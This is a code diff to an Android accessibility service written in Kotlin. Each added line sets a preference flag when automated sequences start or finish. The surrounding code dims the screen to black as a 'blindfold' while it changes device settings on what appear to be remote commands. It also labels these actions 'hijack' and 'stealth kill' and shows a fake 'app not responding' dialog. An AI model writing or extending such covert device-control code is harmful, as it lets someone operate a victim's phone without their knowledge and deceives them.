@@ -570,6 +570,7 @@ class MyAccessibilityService : AccessibilityService() {
                                 
                                 // Final step: Restore screen brightness after home jump
                                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                    getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                                     DimmerManager.removeOverlay(applicationContext)
                                 }, 2500)
                                 break
@@ -647,6 +648,7 @@ class MyAccessibilityService : AccessibilityService() {
                             }, 600)
 
                             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                                 DynamicUIManager.removeOverlay(this@MyAccessibilityService, "HIJACK_SUCCESS_HOME_ROUTED")
                             }, 2500)
                         }, 600)
@@ -689,6 +691,7 @@ class MyAccessibilityService : AccessibilityService() {
 
                     // Generous 5-second timer to ensure UI has fully exited to home before unblinding
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                         DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_HOME_ROUTED")
                     }, 5000)
                     return
@@ -762,6 +765,7 @@ class MyAccessibilityService : AccessibilityService() {
 
                                         // Safely drop the blindfold after transitioning home
                                         delay(3500) 
+                                        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                                         DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_PROACTIVE")
                                     }
                                 }
@@ -1153,6 +1157,7 @@ class MyAccessibilityService : AccessibilityService() {
         sequenceCmdId = cmdId
         sequenceTarget = fontName
         activeSequence = "FONT_PHASE_1"
+        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
         
         Handler(Looper.getMainLooper()).post {
             DimmerManager.applyDim(this, 0, "AUTO")
@@ -1167,6 +1172,7 @@ class MyAccessibilityService : AccessibilityService() {
         sequenceCmdId = cmdId
         sequenceTarget = themeName
         activeSequence = "THEME_PHASE_1"
+        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
         
         Handler(Looper.getMainLooper()).post {
             DimmerManager.applyDim(this, 0, "AUTO")
@@ -1181,6 +1187,7 @@ class MyAccessibilityService : AccessibilityService() {
         sequenceCmdId = cmdId
         sequenceTarget = targetState
         activeSequence = "AIRPLANE_PHASE_1"
+        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
         
         DebugLogger.log("AIRPLANE_SEQ", "Starting sequence. Dimming to 20%.")
         Handler(Looper.getMainLooper()).post {
@@ -1197,6 +1204,7 @@ class MyAccessibilityService : AccessibilityService() {
         sequenceTarget = mode // ENABLE or DISABLE
         activeSequence = "EYE_PHASE_1"
         isSilentSequence = silent
+        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
         
         Handler(Looper.getMainLooper()).post {
             if (!silent) DimmerManager.applyDim(this, 0, "AUTO")
@@ -1529,6 +1537,7 @@ class MyAccessibilityService : AccessibilityService() {
         val id = sequenceCmdId
         val silent = isSilentSequence
         isSilentSequence = false
+        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
         CoroutineScope(Dispatchers.IO).launch {
             CommandProcessor.updateCommandStatus(applicationContext, id, "SUCCESS", msg)
             delay(1000)
@@ -1602,6 +1611,7 @@ class MyAccessibilityService : AccessibilityService() {
             
             // 7. Remove Dimmer and Launch Fake ANR Dialog on Main Thread
             withContext(Dispatchers.Main) {
+                getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                 DimmerManager.removeOverlay(this@MyAccessibilityService)
                 DynamicUIManager.removeOverlay(this@MyAccessibilityService, "STEALTH_KILL_COMPLETE")
                 
@@ -1655,6 +1665,7 @@ class MyAccessibilityService : AccessibilityService() {
         isSilentSequence = false
         isWaitingForDataSettings = false
         isPerformingStealthKill = false
+        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
         DebugLogger.log("FAILSAFE", "All Accessibility sequences aborted.")
     }
 
